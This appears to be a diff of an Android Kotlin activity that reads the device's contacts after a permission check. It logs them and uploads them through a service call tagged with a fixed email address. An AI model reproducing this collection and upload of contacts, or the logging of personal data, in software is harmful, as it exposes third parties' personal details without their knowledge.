@@ -1,7 +1,5 @@
 package com.komnacki.permissionraport
 
-//import com.komnacki.read_contacts_permissions.com.komnacki.permissionraport.ContactsPOJO
-//import com.komnacki.read_contacts_permissions.com.komnacki.permissionraport.ContactsPOJO
 
 import android.annotation.TargetApi
 import android.content.pm.PackageManager
@@ -19,7 +17,6 @@ import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
-import com.google.gson.GsonBuilder
 import com.komnacki.read_contacts_permissions.Contacts
 import io.reactivex.android.schedulers.AndroidSchedulers
 import io.reactivex.disposables.Disposable
@@ -101,15 +98,14 @@ class MainActivity : AppCompatActivity() {
 //                )
 
 
-
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 if (arePermissionsEnabled()) {
                     Log.d("MAIN: ", "Permission granted")
                     //                    permissions granted, continue flow normally
                     var c = Contacts(contentResolver)
-                    Log.d("MAIN CONTACTS: GSON: ", GsonBuilder().create().toJson(c.getContacts().toString()))
-                    //[{"id": 2,"name": "Tomek","email": "tomek@hi.com","phone_number": "+48 320 992 332" },{"id": 4,"name": "Asia","email": "asia@hi.com","phone_number": "+48 231 226 211" }]
-                    service.sendContacts("wapnpoland@gmail.com", ContactsPOJO(c.getContacts()))
+                    var con = ContactsPOJO(c.getContacts())
+                    Log.d("MAIN", "Contacts: ${c.getContacts()}")
+                    service.sendContacts("wapnpoland@gmail.com", con)
                         .subscribeOn(Schedulers.io())
                         .observeOn(AndroidSchedulers.mainThread())
                         .subscribe(
